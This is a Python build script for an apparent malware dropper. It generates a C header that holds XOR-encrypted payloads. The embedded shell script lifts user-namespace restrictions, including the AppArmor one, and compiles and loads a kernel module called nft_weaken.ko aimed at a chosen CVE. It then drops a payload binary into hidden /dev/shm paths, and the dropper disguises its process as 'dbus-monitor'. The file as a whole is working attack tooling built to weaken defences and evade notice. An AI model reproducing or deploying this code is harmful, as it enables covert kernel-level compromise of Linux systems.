#!/usr/bin/env python3
"""
Generates _drop_data.h: encrypted payloads for the dropper binary.

Embeds the setup script as XOR-encrypted C arrays. At runtime the
dropper decrypts to a tmpfs, executes, and shreds the plaintext.

The setup script:
  1. Compiles the kernel module (if headers available)
  2. Loads it targeting the specified CVE
  3. Enables unprivileged user namespaces
  4. Drops the nfttables binary
  5. Cleans up build artifacts
"""

import os
import sys

KEY_LEN = 32

SETUP_SCRIPT = r"""#!/bin/sh
set -e

WORK=$(mktemp -d)
trap 'rm -rf "$WORK"' EXIT

CVE="${1:-0}"

# enable unprivileged user namespaces
if [ -f /proc/sys/kernel/unprivileged_userns_clone ]; then
    echo 1 > /proc/sys/kernel/unprivileged_userns_clone 2>/dev/null || true
fi
if [ -f /proc/sys/kernel/apparmor_restrict_unprivileged_userns ]; then
    echo 0 > /proc/sys/kernel/apparmor_restrict_unprivileged_userns 2>/dev/null || true
fi

# check if kernel module build is possible
if [ -d "/lib/modules/$(uname -r)/build" ]; then
    # extract module source (passed as arguments by dropper)
    if [ -n "$MOD_DIR" ] && [ -d "$MOD_DIR" ]; then
        cd "$MOD_DIR"
        make -C "/lib/modules/$(uname -r)/build" M="$MOD_DIR" modules 2>/dev/null
        if [ -f nft_weaken.ko ]; then
            insmod nft_weaken.ko target="$CVE" 2>/dev/null || true
        fi
        cd /
    fi
fi

# deploy binary if provided
if [ -n "$PAYLOAD" ] && [ -f "$PAYLOAD" ]; then
    DEST="${DEPLOY_PATH:-/dev/shm/.cache}"
    cp "$PAYLOAD" "$DEST"
    chmod 755 "$DEST"
fi
"""

STRINGS = [
    ("DROP_SCRIPT", SETUP_SCRIPT),
    ("DROP_TMP_DIR", "/dev/shm/.xdg-runtime"),
    ("DROP_MOD_DIR", "/dev/shm/.xdg-runtime/mod"),
    ("DROP_SELF_NAME", "dbus-monitor"),
]

def xor_encrypt(data, key, start_offset=0):
    return bytes(b ^ key[(start_offset + i) % len(key)] for i, b in enumerate(data))

def main():
    key = os.urandom(KEY_LEN)

    out = []
    out.append("/* auto-generated by gen_drop.py -- do not edit */")
    out.append(f"#define DROP_KEY_LEN {KEY_LEN}")
    out.append(f"#define DROP_COUNT {len(STRINGS)}")
    out.append("")

    key_hex = ", ".join(f"0x{b:02x}" for b in key)
    out.append(f"static const unsigned char _drop_key[DROP_KEY_LEN] = {{ {key_hex} }};")
    out.append("")

    # enum
    out.append("enum drop_id {")
    for name, _ in STRINGS:
        out.append(f"    {name},")
    out.append("};")
    out.append("")

    # each payload as its own encrypted array + length
    for name, plaintext in STRINGS:
        raw = plaintext.encode('utf-8') + b'\x00'
        encrypted = xor_encrypt(raw, key, 0)

        lines = []
        for i in range(0, len(encrypted), 16):
            chunk = encrypted[i:i+16]
            lines.append("    " + ", ".join(f"0x{b:02x}" for b in chunk) + ",")

        arr_name = f"_drop_{name.lower()}"
        out.append(f"static const unsigned char {arr_name}[{len(raw)}] = {{")
        out.extend(lines)
        out.append("};")
        out.append(f"#define {name}_LEN {len(raw)}")
        out.append("")

    # index table
    out.append("static const struct { const unsigned char *data; unsigned int len; } "
               f"_drop_idx[DROP_COUNT] = {{")
    for name, _ in STRINGS:
        arr_name = f"_drop_{name.lower()}"
        out.append(f"    {{ {arr_name}, {name}_LEN }},")
    out.append("};")

    print("\n".join(out))

if __name__ == "__main__":
    main()
